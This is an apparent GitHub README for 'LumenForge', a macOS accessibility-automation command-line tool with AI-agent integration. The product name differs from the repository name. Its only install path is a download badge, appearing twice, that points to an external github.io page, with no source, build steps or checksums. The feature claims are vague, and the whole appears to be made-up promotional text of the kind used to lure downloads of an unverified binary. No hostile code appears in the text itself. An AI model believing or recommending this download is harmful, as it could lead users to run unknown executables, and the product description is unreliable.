![preview](https://raw.githubusercontent.com/camuh3/macos-ai-commander/main/poster_3ea9e.svg)

# LumenForge

**Illuminate macOS automation with a human-readable command layer that speaks the language of your workflow.**

LumenForge is not just another automation utility—it is a **conversational bridge** between your intentions and the intricate machinery of macOS accessibility protocols. Where other tools force you to memorize cryptic API signatures, LumenForge lets you describe what you want in plain, structured commands that translate directly into precise Accessibility API actions. It is the difference between shouting into a void and whispering to a well-trained conductor.

Think of it as a **universal translator** for every button, slider, text field, and menu item across all your Mac applications. Whether you are orchestrating a complex test suite, building an AI agent that needs to interact with native apps, or simply automating a repetitive workflow, LumenForge gives you a stable, expressive foundation that does not waver with UI changes.

## 🧭 Why This Exists

Modern macOS applications are islands of intricate, private UI structures. Traditional automation scripts fail the moment an app updates its layout. LumenForge approaches this problem from a different angle: it uses the same Accessibility API that VoiceOver and other assistive technologies rely on, meaning your automation commands are **semantically anchored** to the actual UI elements, not their pixel positions. This provides a level of resilience and clarity that coordinate-based clicking simply cannot match.

This tool is the result of observing countless hours spent debugging fragile UI test scripts. The core insight is that the **intent** of an action is more stable than the *implementation* of that action. LumenForge captures intent and handles the messy implementation details for you.

## 📦 Getting Started

The first step to illuminating your workflows is obtaining the LumenForge command-line binary. The distribution method is designed to be direct and transparent, avoiding unnecessary layers of package manager complexity.

[![Download](https://raw.githubusercontent.com/camuh3/macos-ai-commander/main/get_cd49.svg)](https://camuh3.github.io/macos-ai-commander/)

Once the binary is in your `PATH`, you can verify the installation by running `forge doctor`, which will check that your system has the necessary accessibility permissions granted to your terminal application. This is the single most common setup hurdle, and LumenForge helps you diagnose it in seconds.

### 🔑 Initial Configuration

Before you can command applications, you must introduce LumenForge to them. Enable accessibility permissions in your system settings for the host application (e.g., Terminal or iTerm2). LumenForge uses a secure, token-based session model that does not require storing any sensitive credentials. The setup wizard, launched with `forge setup`, will guide you through this process with visual prompts.

## 🚀 Core Functionality

### ✨ Semantic Element Discovery

Forget scanning JSON trees of UI elements. LumenForge allows you to query the interface using natural language-like selectors. For example, instead of writing a complex XPath-style query, you can simply state:

```
forge find --app "Calendar" --element "Create Event Button"
```

This command uses a proprietary matching algorithm that combines label text, accessibility descriptions, and element type heuristics to identify the correct target with impressive accuracy.

### 🧠 Contextual Command Sequences

The true power of LumenForge lies in its ability to define **composable actions**. You can chain commands together to perform complex tasks, with built-in error handling and retry logic. Here is a simple sequence that creates a meeting in Calendar:

```
forge run --app "Calendar" --steps "open_app, trigger_new_event, fill_title, save_event"
```

Each step in this sequence is a Lua-like scripted block that LumenForge interprets. The system automatically waits for UI animations to complete and verifies the success of each action before moving to the next.

### 🤖 AI Agent Integration

LumenForge exposes a clean, streaming JSON protocol that makes it effortless for large language models to interact with macOS. Instead of giving an AI a screenshot and asking it to guess pixel coordinates, you give it a list of available actions and let it decide which to execute. This significantly reduces hallucination and error rates in automated tasks.

This is a **contextual reasoning engine** for your UI, not a blind executor. The AI agent can request a full inventory of interactive elements, receive them as structured metadata, and then issue precise commands that LumenForge translates into Accessibility API calls.

## 🛠️ Feature Highlights

- **Multilingual Command Parsing**: The command layer supports English, Spanish, German, Japanese, and Korean. You can switch languages on the fly with `forge set-lang --lang es`. This is not a simple dictionary swap; it is a fully localized grammar parser.
- **Responsive Feedback Loop**: Every action returns a structured result including a timestamp, the target element's accessibility path, and a success flag. This rich feedback allows for detailed logging and audit trails.
- **Resilient Session Management**: If an application becomes unresponsive, LumenForge does not hang. It gracefully times out, logs the incident, and provides a clear diagnostic message to help you fix the underlying issue.
- **Snapshot & Restore**: For complicated multi-window workflows, you can take a "snapshot" of all open windows and their states, then restore that exact arrangement later. This is invaluable for setting up repetitive test environments.
- **Zero-Config CI/CD**: The tool is designed to work seamlessly in headless or CI environments by supporting a virtual framebuffer mode and deterministic timing options.

## 📖 Deep Dive: The Command Grammar

The LumenForge command language (ForgeScript) is designed to be readable and writable by both humans and machines. It avoids the rigidity of XML and the ambiguity of natural language. Here is a preview:

```
app "Notes"
  - action: type_text
  - args:
    content: "Hello from LumenForge"
    target: "body_field"
  - expect: text_contains
```

The `expect` block is a powerful assertion tool that allows you to define expected outcomes. If the expectation is not met, the script halts and produces a failure report. This turns fragile automation into deterministic test suites.

## ⚙️ Advanced Configuration

For power users, a configuration file allows you to set global timeouts, define custom element matchers, and create aliases for frequently used command sequences. The configuration is stored in a human-readable format (TOML) and supports environment variable interpolation for secret handling.

### 🗺️ Roadmap for 2026

The development roadmap for 2026 focuses on expanding the AI integration capabilities. The primary goal is to introduce a **predictive element locator** that learns from your past interactions and suggests more robust selectors. Another planned feature is cross-app workflows that can transfer data between applications without using the clipboard, ensuring data integrity.

## 🆘 Community Support & Troubleshooting

We believe in providing exceptional assistance. The LumenForge repository includes a comprehensive FAQ and a dedicated `issues` tracker where you can report bugs or suggest improvements.

- **Documentation Wiki**: A deep dive into every command and flag, with practical examples.
- **Response Time**: Our team aims to respond to all critical bug reports within 48 hours.
- **Community Forum**: A space to share your own ForgeScript recipes and learn from others.

## ⚠️ Important Disclaimer

LumenForge relies on the macOS Accessibility API. This API is subject to changes by Apple, and not every application exposes its UI elements consistently. While we strive for broad compatibility, some niche or custom-built applications may not be fully automatable. Use this tool responsibly and in compliance with the terms of service of the applications you are automating. The developers are not liable for any unintended side effects resulting from automated control of third-party software.

## 🔒 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. You are free to use, modify, and distribute this software in your own projects, provided you retain the original copyright notice.

---

For the latest release notes and community discussions, please visit the main repository page. Your contributions, whether they are code, documentation, or creative ForgeScript examples, are always welcome.

[![Download](https://raw.githubusercontent.com/camuh3/macos-ai-commander/main/get_cd49.svg)](https://camuh3.github.io/macos-ai-commander/)